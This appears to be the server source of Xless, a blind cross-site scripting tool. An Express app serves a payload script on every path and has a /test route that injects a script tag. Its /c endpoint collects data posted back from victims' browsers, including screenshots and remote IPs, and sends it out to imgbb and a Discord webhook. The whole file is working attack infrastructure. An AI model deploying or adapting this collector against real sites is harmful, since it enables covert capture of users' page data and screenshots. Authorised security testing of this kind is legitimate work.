// Xless: The Serverlesss Blind XSS App.
// Version: v1.2
// Author: Mazin Ahmed <mazin@mazinahmed.net>

import express from "express";
import bodyParser from "body-parser";
import cors from "cors";
import path from "path";
import fs from "fs";
import * as url from "url";

// Support local development with .env
import { config } from "dotenv";
import { uploadImage } from "./src/uploadImage.js";
import { notifyBXSS, notifyMessage } from "./src/notifyDiscord.js";

config();

const __dirname = url.fileURLToPath(new URL(".", import.meta.url));
const port = process.env.PORT || 3000;
const imgbbApiKey = process.env.IMGBB_API_KEY;
const discordIncomingWebhook = process.env.DISCORD_INCOMING_WEBHOOK;

const app = express();
app
  .disable("etag")
  .disable("x-powered-by")
  .use(cors())
  .use(bodyParser.json({ limit: "15mb" }))
  .use(bodyParser.urlencoded({ limit: "15mb", extended: true }))
  .use((req, res, next) => {
    // Headers
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Methods", "GET,POST");
    res.header("Access-Control-Allow-Headers", "Content-Type");
    next();
  });

app.get("/favicon.ico", (_req, res) => {
  res.end();
});

app.get("/test", (req, res) => {
  res.header("Content-Type", "text/html");

  const url = "//" + req.headers["host"];

  res.send(`TEST<script src="${url}"></script>`);
});

app.all("/message", (req, res) => {
  res.send("ok");
  res.end();

  const message = req.query.text || req.body.text || "";
  if (message) {
    notifyMessage(
      {
        message,
      },
      discordIncomingWebhook
    );
  }
});

app.post("/c", async (req, res) => {
  res.send("ok");
  res.end();

  let data = req.body;

  // Upload our screenshot and only then send the Slack alert
  data["Screenshot URL"] = "NA";

  if (imgbbApiKey && data["Screenshot"]) {
    const encoded_screenshot = data["Screenshot"].replace(
      "data:image/png;base64,",
      ""
    );

    delete data["Screenshot"];

    try {
      const imgOut = await uploadImage(encoded_screenshot, imgbbApiKey);
      if (imgOut.data?.url) {
        // Add the URL to our data array, so it will be included on our Slack message
        data["Screenshot URL"] = imgOut.data.url;
      }
    } catch (e) {
      data["Screenshot Error"] = e.message;
    }
  }

  // Now handle the regular Slack alert
  data["Remote IP"] =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  notifyBXSS(data, discordIncomingWebhook);
});

/**
 * Route to check the health of our xless listener
 */
app.get("/health", async (req, res) => {
  const health_data = {
    IMGBB_API_KEY: typeof imgbbApiKey !== "undefined",
    DISCORD_INCOMING_WEBHOOK: typeof discordIncomingWebhook !== "undefined",
  };

  // Check if the environment vars are set
  if (
    [health_data.IMGBB_API_KEY, health_data.DISCORD_INCOMING_WEBHOOK].some(
      (key) => !key
    )
  ) {
    res.json(health_data);
    return res.end();
  }

  const xless_logo = fs
    .readFileSync(path.join(__dirname, "assets/logo.png"))
    .toString("base64");

  try {
    const imgOut = await uploadImage(xless_logo, imgbbApiKey);
    if (imgOut.error) {
      health_data.imgbb_response = imgOut.error;
    } else if (imgOut?.data?.display_url) {
      health_data.imgbb_response = imgOut.data.display_url;
    }
  } catch (e) {
    health_data.imgbb_response = e.message;
  }

  res.json(health_data);
  res.end();
});

app.all("/*", (req, res) => {
  const headers = req.headers;
  const body = req.body;

  // notifyOOBCallback(
  //   {
  //     body,
  //     headers,
  //     path: req.url,
  //     remoteIP: req.headers["x-forwarded-for"] || req.connection.remoteAddress,
  //   },
  //   discordIncomingWebhook
  // );

  res.sendFile(path.join(__dirname, "payload.js"));
});

app.listen(port, (err) => {
  if (err) throw err;
  console.log(`> Ready On Server http://localhost:${port}`);
});
